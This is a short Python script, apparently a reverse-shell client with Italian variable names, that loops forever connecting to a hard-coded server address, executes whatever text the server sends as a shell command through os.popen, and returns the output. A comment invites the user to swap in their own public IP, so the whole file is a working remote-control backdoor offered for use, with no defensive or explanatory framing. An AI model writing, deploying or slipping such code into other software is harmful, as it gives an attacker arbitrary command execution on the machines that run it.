import socket
from os import popen as run
import urllib.request

TOSEND = 'eccomi'

def send(s, comando):
    s.send(comando.encode())
    risp = s.recv(4096)
    gigi = run(risp.decode())
    tosend = f'{gigi.read()}'
    s.close()
    
    return tosend

def conn(indirizzo_server, richie):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.connect(indirizzo_server)
        return send(s, richie)
    except socket.error as errore:
        return f"Connection error \n{errore}"

address = ('192.168.1.83', 5400)  # change this to your public ip (here I put private for obvious reasons :3)

while True:
    TOSEND = conn(address, TOSEND)
